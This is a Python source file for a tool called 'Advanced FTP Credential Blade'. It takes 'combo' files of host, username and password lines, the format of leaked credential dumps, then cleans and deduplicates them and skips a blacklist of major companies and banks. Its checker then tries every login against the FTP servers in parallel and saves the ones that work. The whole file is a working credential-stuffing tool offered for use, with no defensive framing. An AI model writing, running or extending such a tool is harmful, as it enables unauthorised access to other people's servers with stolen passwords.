import re
import ftplib
import socket
import os
import concurrent.futures
import logging
import time
import sys
from datetime import datetime

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, TaskProgressColumn
    from rich.text import Text
    from rich.live import Live
    from rich.layout import Layout
    from rich.align import Align
    from rich.rule import Rule
    from rich.prompt import Prompt, IntPrompt
    from rich import box
    from rich.style import Style
    from rich.columns import Columns
    from rich.padding import Padding
    import rich.traceback
    rich.traceback.install()
except ImportError:
    print("Installing 'rich' library...")
    os.system(f"{sys.executable} -m pip install rich tqdm -q")
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, TaskProgressColumn
    from rich.text import Text
    from rich.live import Live
    from rich.layout import Layout
    from rich.align import Align
    from rich.rule import Rule
    from rich.prompt import Prompt, IntPrompt
    from rich import box
    from rich.style import Style
    from rich.columns import Columns
    from rich.padding import Padding
    import rich.traceback
    rich.traceback.install()

try:
    from tqdm import tqdm
except ImportError:
    os.system(f"{sys.executable} -m pip install tqdm -q")
    from tqdm import tqdm

console = Console()

DEFAULT_PORT    = 21
DEFAULT_TIMEOUT = 5
MAX_THREADS     = 50

LOG_FILE = "ftp_tool.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler(LOG_FILE)],
)

BLACKLISTED_DOMAINS = {
    'facebook.com','fb.com','meta.com','google.com','gmail.com','youtube.com',
    'googleapis.com','gstatic.com','microsoft.com','live.com','outlook.com',
    'msn.com','bing.com','azure.com','apple.com','icloud.com','itunes.com',
    'amazon.com','aws.amazon.com','primevideo.com','twitter.com','x.com',
    'instagram.com','tiktok.com','netflix.com','spotify.com',
    'bankofamerica.com','chase.com','wellsfargo.com','citibank.com','usbank.com',
    'paypal.com','stripe.com','squareup.com','github.com','gitlab.com',
    'cloudflare.com','akamai.com','fastly.net','linkedin.com','indeed.com',
    'glassdoor.com','walmart.com','target.com','ebay.com','etsy.com',
    'craigslist.org','yahoo.com','aol.com','verizon.com','att.com','tmobile.com',
    'dropbox.com','onedrive.com','box.com','reddit.com','pinterest.com',
    'tumblr.com','nytimes.com','cnn.com','bbc.co.uk','foxnews.com',
    'theguardian.com','wikipedia.org','imdb.com','stackoverflow.com','quora.com',
    'zoom.us','slack.com','discord.com','teams.microsoft.com','adobe.com',
    'photoshop.com','figma.com','canva.com','uber.com','lyft.com','airbnb.com',
    'booking.com','expedia.com','tripadvisor.com','nasa.gov','gov.uk',
    'whitehouse.gov','europa.eu','wordpress.com','medium.com','blogger.com',
    'salesforce.com','oracle.com','ibm.com','sap.com','shopify.com',
    'woocommerce.com','godaddy.com','namecheap.com','bluehost.com',
    'hostgator.com','siteground.com','cloudfront.net','s3.amazonaws.com',
}

BANNER = """
[bold cyan]
 ███████╗████████╗██████╗     ██████╗ ██╗      █████╗ ██████╗ ███████╗
 ██╔════╝╚══██╔══╝██╔══██╗    ██╔══██╗██║     ██╔══██╗██╔══██╗██╔════╝
 █████╗     ██║   ██████╔╝    ██████╔╝██║     ███████║██║  ██║█████╗
 ██╔══╝     ██║   ██╔═══╝     ██╔══██╗██║     ██╔══██║██║  ██║██╔══╝
 ██║        ██║   ██║         ██████╔╝███████╗██║  ██║██████╔╝███████╗
 ╚═╝        ╚═╝   ╚═╝         ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝
[/bold cyan]"""

def ts():
    return datetime.now().strftime("%H:%M:%S")

def log_info(msg):
    logging.info(msg)

def print_header():
    console.clear()
    console.print(BANNER)
    console.print(
        Panel(
            "[bold white]Advanced FTP Credential Blade[/bold white]  |  "
            f"[dim]v2.0  ·  {datetime.now().strftime('%d %b %Y')}[/dim]",
            style="cyan",
            box=box.DOUBLE_EDGE,
            padding=(0, 4),
        )
    )
    console.print()

def section(title: str):
    console.print()
    console.print(Rule(f"[bold cyan] {title} [/bold cyan]", style="cyan dim"))
    console.print()

def success(msg):  console.print(f"  [bold green]✔[/bold green]  {msg}")
def warn(msg):     console.print(f"  [bold yellow]⚠[/bold yellow]  {msg}")
def error(msg):    console.print(f"  [bold red]✘[/bold red]  {msg}")
def info(msg):     console.print(f"  [cyan]»[/cyan]  {msg}")

def is_host_reachable(host, port=DEFAULT_PORT, timeout=DEFAULT_TIMEOUT):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            return s.connect_ex((host, int(port))) == 0
    except (socket.gaierror, socket.timeout, ValueError):
        return False

def is_blacklisted(host):
    h = host.lower().strip().lstrip("www.")
    return any(h == d or h.endswith("." + d) for d in BLACKLISTED_DOMAINS)

def sanitize_hostpart(h):
    h = re.sub(r'^\s*https?://', '', h, flags=re.IGNORECASE)
    if '@' in h and not re.match(r'^\d+\.\d+\.\d+\.\d+', h):
        h = h.rsplit('@', 1)[-1]
    return h.split('/')[0].strip(' ,;:')

def parse_line(line):
    line = line.strip()
    if not line:
        return None, "empty"
    parts = line.split('|')
    if len(parts) < 3:
        return None, "not_enough_parts"
    hostpart = sanitize_hostpart(parts[0].strip())
    user = parts[1].strip()
    pwd  = '|'.join(parts[2:]).strip()
    if not hostpart:
        return None, "empty_host"
    m = re.match(r'^\[?(?P<host>[^:\]]+)\]?(?::(?P<port>\d+))?$', hostpart)
    if not m:
        if '@' in hostpart:
            hostpart = hostpart.rsplit('@', 1)[-1]
            m = re.match(r'^(?P<host>[^:]+)(?::(?P<port>\d+))?$', hostpart)
        if not m:
            return None, "bad_host_format"
    host = m.group('host').strip()
    port = m.group('port') or str(DEFAULT_PORT)
    if not host:
        return None, "empty_host_after_parse"
    if is_blacklisted(host):
        return None, "blacklisted_domain"
    if not is_host_reachable(host, port):
        return None, "host_unreachable"
    return f"{host}:{port}|{user}|{pwd}", None

def ftp_check_worker(combo, timeout=DEFAULT_TIMEOUT):
    try:
        host, user, pw = combo.strip().split('|')
        port = DEFAULT_PORT
        if ':' in host:
            host, port = host.split(':', 1)
        ftp = ftplib.FTP()
        ftp.connect(host, int(port), timeout=timeout)
        ftp.login(user, pw)
        ftp.quit()
        log_info(f"VALID: {combo}")
        return combo
    except Exception:
        return None

def clean_combos():
    section("COMBO CLEANER")

    inp_path = Prompt.ask("  [cyan]Combo file path[/cyan]").strip().strip('"')
    if not os.path.isfile(inp_path):
        error(f"File not found: [bold]{inp_path}[/bold]")
        return

    out_path     = os.path.splitext(inp_path)[0] + "_cleaned.txt"
    skipped_path = os.path.splitext(inp_path)[0] + "_skipped.txt"

    with open(inp_path, 'r', encoding='utf-8', errors='replace') as f:
        lines = f.readlines()

    total   = len(lines)
    cleaned, skipped = [], []
    skip_reasons: dict = {}

    info(f"Processing [bold]{total:,}[/bold] lines …")
    console.print()

    with Progress(
        SpinnerColumn(style="cyan"),
        TextColumn("[cyan]{task.description}[/cyan]"),
        BarColumn(bar_width=40, style="cyan", complete_style="bold green"),
        TaskProgressColumn(),
        TextColumn("[dim]{task.completed}/{task.total}[/dim]"),
        TimeElapsedColumn(),
        console=console,
        transient=False,
    ) as progress:
        task = progress.add_task("Cleaning combos", total=total)
        for line in lines:
            out, err = parse_line(line)
            if out:
                cleaned.append(out)
            else:
                skipped.append((line.rstrip('\n'), err))
                skip_reasons[err] = skip_reasons.get(err, 0) + 1
            progress.advance(task)
            
    seen, deduped = set(), []
    for c in cleaned:
        if c not in seen:
            deduped.append(c)
            seen.add(c)
    dupes = len(cleaned) - len(deduped)

    with open(out_path, 'w', encoding='utf-8') as fo:
        fo.write('\n'.join(deduped))
    with open(skipped_path, 'w', encoding='utf-8') as fs:
        for ln, reason in skipped:
            fs.write(f"{reason}\t{ln}\n")

    log_info(f"Cleaning done – cleaned: {len(deduped)}, skipped: {len(skipped)}")

    console.print()
    tbl = Table(box=box.ROUNDED, border_style="cyan dim", header_style="bold cyan",
                title="[bold cyan]Cleaning Results[/bold cyan]", title_justify="left")
    tbl.add_column("Metric",    style="white",      min_width=20)
    tbl.add_column("Count",     style="bold white",  justify="right")
    tbl.add_column("",          style="dim",         justify="left")

    tbl.add_row("Total lines",        f"{total:,}",          "")
    tbl.add_row("✔  Valid combos",    f"[bold green]{len(deduped):,}[/bold green]",  "")
    tbl.add_row("⊘  Duplicates",      f"[yellow]{dupes:,}[/yellow]",                "removed")
    tbl.add_row("✘  Skipped",         f"[red]{len(skipped):,}[/red]",               "")
    console.print(tbl)

    if skip_reasons:
        console.print()
        rtbl = Table(box=box.SIMPLE_HEAD, border_style="dim", header_style="bold yellow",
                     title="[bold yellow]Skip Reasons[/bold yellow]", title_justify="left")
        rtbl.add_column("Reason", style="yellow")
        rtbl.add_column("Count",  style="white", justify="right")
        for reason, count in sorted(skip_reasons.items(), key=lambda x: -x[1]):
            rtbl.add_row(reason, f"{count:,}")
        console.print(rtbl)

    console.print()
    success(f"Cleaned saved  → [bold]{out_path}[/bold]")
    success(f"Skipped saved  → [bold]{skipped_path}[/bold]")

def ftp_checker():
    section("FTP CREDENTIAL CHECKER")

    combo_path = Prompt.ask("  [cyan]Cleaned combo file path[/cyan]").strip().strip('"')
    if not os.path.isfile(combo_path):
        error(f"File not found: [bold]{combo_path}[/bold]")
        return

    threads_num = IntPrompt.ask(
        f"  [cyan]Threads (1–{MAX_THREADS})[/cyan]",
        default=10
    )
    if not 1 <= threads_num <= MAX_THREADS:
        error(f"Thread count must be 1–{MAX_THREADS}")
        return

    out_path = "validftp.txt"

    with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
        combos = [x.strip() for x in f if x.strip()]

    total = len(combos)
    if total == 0:
        warn("Combo file is empty.")
        return

    info(f"Loaded [bold]{total:,}[/bold] combos  ·  threads: [bold]{threads_num}[/bold]")
    console.print()

    valid_list = []
    checked = 0

    with Progress(
        SpinnerColumn(style="bold cyan"),
        TextColumn("[cyan]{task.description}[/cyan]"),
        BarColumn(bar_width=42, style="cyan dim", complete_style="bold cyan"),
        TaskProgressColumn(),
        TextColumn("[dim]{task.completed}/{task.total}[/dim]"),
        TextColumn("[bold green]✔ {task.fields[valid]}[/bold green]"),
        TimeElapsedColumn(),
        console=console,
        transient=False,
    ) as progress:
        task = progress.add_task("Checking FTPs", total=total, valid=0)

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads_num) as ex:
            futures = {ex.submit(ftp_check_worker, c): c for c in combos}
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                checked += 1
                if result:
                    valid_list.append(result)
                    combo_short = result.split('|')[0]
                    console.print(
                        f"  [bold green]✔ VALID[/bold green]  "
                        f"[white]{combo_short}[/white]  "
                        f"[dim]{ts()}[/dim]"
                    )
                progress.update(task, advance=1, valid=len(valid_list))

    with open(out_path, 'w', encoding='utf-8') as f:
        f.write('\n'.join(valid_list))

    log_info(f"FTP check done – valid: {len(valid_list)}/{total}")
    
    console.print()
    rate = (len(valid_list) / total * 100) if total else 0
    stbl = Table(box=box.ROUNDED, border_style="cyan dim", header_style="bold cyan",
                 title="[bold cyan]Check Summary[/bold cyan]", title_justify="left")
    stbl.add_column("Metric",   style="white",      min_width=22)
    stbl.add_column("Value",    style="bold white",  justify="right")

    stbl.add_row("Total checked",     f"{total:,}")
    stbl.add_row("✔  Valid",          f"[bold green]{len(valid_list):,}[/bold green]")
    stbl.add_row("✘  Invalid",        f"[red]{total - len(valid_list):,}[/red]")
    stbl.add_row("Success rate",      f"[yellow]{rate:.1f}%[/yellow]")
    console.print(stbl)

    console.print()
    success(f"Results saved → [bold]{out_path}[/bold]")

def main_menu():
    print_header()

    menu_items = [
        ("[bold white]1[/bold white]", "Clean & Deduplicate Combo File",   "cyan"),
        ("[bold white]2[/bold white]", "Check FTP Credentials",            "cyan"),
        ("[bold white]3[/bold white]", "Exit",                             "dim"),
    ]

    tbl = Table(box=box.ROUNDED, border_style="cyan dim", show_header=False,
                padding=(0, 2))
    tbl.add_column("Key",    style="bold cyan", justify="center", width=4)
    tbl.add_column("Action", style="white",     min_width=35)
    for key, label, style in menu_items:
        tbl.add_row(key, f"[{style}]{label}[/{style}]")

    console.print(Padding(tbl, (0, 4)))
    console.print()

    while True:
        choice = Prompt.ask("  [bold cyan]Select[/bold cyan]").strip()
        if choice == '1':
            clean_combos()
            console.print()
            info("Press [bold]Enter[/bold] to return to menu …")
            input()
            print_header()
            console.print(Padding(tbl, (0, 4)))
            console.print()
        elif choice == '2':
            ftp_checker()
            console.print()
            info("Press [bold]Enter[/bold] to return to menu …")
            input()
            print_header()
            console.print(Padding(tbl, (0, 4)))
            console.print()
        elif choice == '3':
            console.print()
            console.print(
                Panel("[bold cyan]Session closed.[/bold cyan]  Logs → [dim]ftp_tool.log[/dim]",
                      style="cyan dim", box=box.ROUNDED, padding=(0, 4))
            )
            console.print()
            break
        else:
            warn("Invalid option – enter [bold]1[/bold], [bold]2[/bold], or [bold]3[/bold]")

if __name__ == "__main__":
    main_menu()
